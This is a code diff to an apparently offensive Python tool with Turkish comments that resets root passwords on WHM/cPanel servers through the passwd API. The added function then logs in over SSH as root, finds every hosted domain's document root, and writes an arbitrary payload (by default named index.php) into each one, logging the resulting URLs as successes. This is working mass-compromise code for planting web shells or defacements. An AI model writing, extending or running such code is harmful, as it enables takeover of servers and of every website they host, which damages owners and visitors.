@@ -603,6 +603,68 @@ def _whm_json_ok_reason(data):
     return ok, reason
 
 
+def _run_ssh_deploy(host: str, ssh_port: int, user: str, password: str, args):
+    """passwd başarılı sonrası SSH ile tüm domainlere dosya deploy eder."""
+    try:
+        from ssh_list_domains import discover_document_roots, deploy_to_all_roots
+    except ImportError:
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        sys.path.insert(0, script_dir)
+        try:
+            from ssh_list_domains import discover_document_roots, deploy_to_all_roots
+        except ImportError:
+            log("ERR", "ssh_list_domains.py bulunamadı, deploy atlanıyor")
+            return
+
+    deploy_file = getattr(args, "ssh_deploy_file", None)
+    deploy_content = getattr(args, "ssh_deploy_content", None)
+    deploy_filename = getattr(args, "ssh_deploy_filename", "index.php")
+    deploy_output = getattr(args, "ssh_deploy_output", "deploy_success.txt")
+    timeout = getattr(args, "timeout", 30)
+
+    if deploy_file:
+        try:
+            with open(deploy_file, "rb") as f:
+                payload = f.read()
+        except OSError as e:
+            log("ERR", f"SSH deploy dosyası okunamadı: {e}")
+            return
+    elif deploy_content:
+        payload = deploy_content.encode("utf-8")
+    else:
+        log("ERR", "SSH deploy için --ssh-deploy-file veya --ssh-deploy-content gerekli")
+        return
+
+    log("INFO", f"SSH deploy başlatılıyor → {user}@{host}:{ssh_port}")
+    try:
+        roots = discover_document_roots(host, ssh_port, user, password, timeout)
+        if not roots:
+            log("WARN", f"SSH deploy: DocumentRoot bulunamadı ({host})")
+            return
+
+        log("OK", f"{len(roots)} domain bulundu, deploy ediliyor: {deploy_filename}")
+        results, urls = deploy_to_all_roots(
+            host, ssh_port, user, password,
+            roots, deploy_filename, payload, timeout
+        )
+
+        success = sum(1 for v in results.values() if v)
+        fail = sum(1 for v in results.values() if not v)
+        log("OK", f"SSH deploy tamamlandı: {success} başarılı, {fail} başarısız ({host})")
+
+        if urls:
+            try:
+                with open(deploy_output, "a", encoding="utf-8") as f:
+                    for url in urls:
+                        f.write(url + "\n")
+                log("OK", f"{len(urls)} URL kaydedildi → {deploy_output}")
+            except OSError as e:
+                log("ERR", f"Deploy çıktı dosyası yazılamadı: {e}")
+
+    except Exception as e:
+        log("ERR", f"SSH deploy hatası ({host}): {e}")
+
+
 def action_change_passwd_result(ctx, new_password):
     """WHM passwd API; (ok, http_status, data) döner."""
     log("API", f"Changing root password → {new_password}")
@@ -900,6 +962,11 @@ def scan(target: str, args) -> dict:
                     pw_append_path, target, "root", args.passwd)
                 _, hh, pp = parse_target(target)
                 log("OK", f"passwd API başarılı → wordlist +1  {hh}:{pp}")
+            if ok and getattr(args, "ssh_deploy", False):
+                _, ssh_host, _ = parse_target(target)
+                _run_ssh_deploy(
+                    ssh_host, args.ssh_port, "root", args.passwd, args
+                )
             elif pw_append_path and not ok:
                 log("WARN",
                     f"passwd API başarısız (wordlist yok): {target} — "
@@ -1457,6 +1524,20 @@ Toplu root şifre (results.json → WHM passwd; başarılar wordlist .txt):
                     help="Başarılı passwd wordlist: host:port root şifre (satır başına)")
     bg.add_argument("--bulk-passwd-fail-out", default="bulk_passwd_fail.json",
                     help="passwd başarısız hedefler JSON")
+
+    dg = p.add_argument_group("SSH Deploy (passwd başarılı sonrası otomatik)")
+    dg.add_argument("--ssh-deploy", action="store_true",
+                    help="passwd başarılı olunca SSH ile tüm domainlere dosya deploy et")
+    dg.add_argument("--ssh-deploy-file", metavar="FILE",
+                    help="Deploy edilecek yerel dosya yolu")
+    dg.add_argument("--ssh-deploy-content", metavar="TEXT",
+                    help="Deploy edilecek inline içerik")
+    dg.add_argument("--ssh-deploy-filename", default="index.php",
+                    help="Hedef dosya adı (varsayılan: index.php)")
+    dg.add_argument("--ssh-port", type=int, default=22,
+                    help="SSH portu (varsayılan: 22)")
+    dg.add_argument("--ssh-deploy-output", default="deploy_success.txt",
+                    help="Başarılı URL'lerin kaydedileceği dosya (varsayılan: deploy_success.txt)")
 
     og = p.add_argument_group("Output")
     og.add_argument("-o","--output",   help="Save results to JSON file")
